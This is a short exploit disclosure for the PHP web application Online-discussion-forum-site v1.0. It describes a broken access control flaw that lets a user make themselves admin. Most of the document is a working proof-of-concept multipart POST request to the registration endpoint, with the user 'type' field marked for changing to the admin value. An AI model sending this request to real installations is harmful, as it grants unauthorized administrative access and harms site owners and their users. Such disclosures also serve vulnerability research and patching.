# Exploit Title: Online-discussion-forum-site v1.0 - Broken Object Property Level Authorization(BOPLA)
## Date: 2/1/2024
## Vendor Homepage: https://www.sourcecodester.com/php/15337/online-discussion-forum-site-phpoop-free-source-code.html
## Tested on: Debian Linux, Apache, Mysql
## Vendor: oretnom23
## Version: v1.0
## Exploit Description:
## Online-discussion-forum-site v1.0 suffers from BOPLA - Broken Access Control Vulnerability allowing attackers to change his access type to admin(vertical privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /odfs/classes/Users.php?f=registration HTTP/1.1
...

------WebKitFormBoundary9ihAAP8cxVXmfD7l
Content-Disposition: form-data; name="id"

6
------WebKitFormBoundary9ihAAP8cxVXmfD7l
Content-Disposition: form-data; name="type"

1(CHANGE HERE)
------WebKitFormBoundary9ihAAP8cxVXmfD7l
Content-Disposition: form-data; name="firstname"

user1
------WebKitFormBoundary9ihAAP8cxVXmfD7l
Content-Disposition: form-data; name="middlename"

m
------WebKitFormBoundary9ihAAP8cxVXmfD7l
Content-Disposition: form-data; name="lastname"

h
------WebKitFormBoundary9ihAAP8cxVXmfD7l
Content-Disposition: form-data; name="username"

user1
------WebKitFormBoundary9ihAAP8cxVXmfD7l
Content-Disposition: form-data; name="password"


------WebKitFormBoundary9ihAAP8cxVXmfD7l
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundary9ihAAP8cxVXmfD7l--
```